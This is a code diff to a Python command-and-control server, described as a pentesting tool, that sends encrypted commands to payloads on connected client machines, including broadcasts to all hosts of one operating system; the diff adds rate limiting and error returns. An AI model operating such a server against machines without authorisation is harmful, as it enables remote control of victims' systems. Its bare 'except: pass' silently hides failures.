@@ -4,6 +4,7 @@ from typing import Tuple, Dict
 import sys
 from colorama import Fore
 import logging
+import time
 from modules.server_modules.RSAcryptography import cryptography_toolkit
 from modules.server_modules.logo import logo
 from modules.server_modules.help import help_message
@@ -21,7 +22,7 @@ Please note: this server is strictly to be used for pentesting only, therefore
 it does not have any functions relating to denial of service attacks or anything else 
 intended to cause harm.
     '''
-    def __init__(self, host_port: int=55555, bytesize: int=1024) -> None:
+    def __init__(self, host_port: int=55555, bytesize: int=1024, RATE_LIMIT_TIME: float | int=0.5) -> None:
         ''' Class Initializer '''
 
         # Obtain host information
@@ -30,6 +31,9 @@ intended to cause harm.
 
         # Bytesize of messages being sent between the server and client
         self.bytesize: int = bytesize
+
+        # Amount of time between each command input by user
+        self.RATE_LIMIT_TIME: float | int = RATE_LIMIT_TIME
         
         # Variable storing the ip address of the current connected client
         self.connected_client: bool | str = None 
@@ -131,9 +135,6 @@ intended to cause harm.
 
                 # Flag to send command to first payload on all clients using a particular OS
                 elif all_OS:
-                    # Check if there is a client connected
-                    if len(self.client_list.keys()) == 0:
-                        print("No clients connected")
                     
                     # Display all OS 
                     print('All connected operating systems: ')
@@ -149,6 +150,7 @@ intended to cause harm.
                     # Ensure chosen_OS is valid
                     if chosen_OS not in self.OS_list.keys():
                         print('OS not being used by any connected clients ')
+                        return False
                     
                     # Send command to first payload on all clients using chosen_OS
                     for client_ip in self.client_list.keys():
@@ -162,9 +164,6 @@ intended to cause harm.
                 
                 # Flag to send command on all payloads across all clients using a particular OS
                 elif all_OS_payloads:
-                    # Check if there is a client connected
-                    if len(self.client_list.keys()) == 0:
-                        print("No clients connected")
                     
                     # Display all OS 
                     print('All connected operating systems: ')
@@ -180,6 +179,7 @@ intended to cause harm.
                     # Ensure chosen_OS is valid
                     if chosen_OS not in self.OS_list.keys():
                         print('OS not being used by any connected clients ')
+                        return False
                     
                     # Send command to first payload on all clients using chosen_OS
                     for connection in self.OS_list[chosen_OS]:
@@ -195,6 +195,7 @@ intended to cause harm.
                     client: socket.socket = self.client_list[client_ip][0][0] # Get client socket
                     encrypted_command: str = self.encrypt_command(command, client)
                     client.send(encrypted_command.encode()) # Send command to client
+                time.sleep(self.RATE_LIMIT_TIME) # Rate limiting to prevent user from spamming commands
         except: # Pretend the error doesn't exist and it will resolve itself
             pass
 
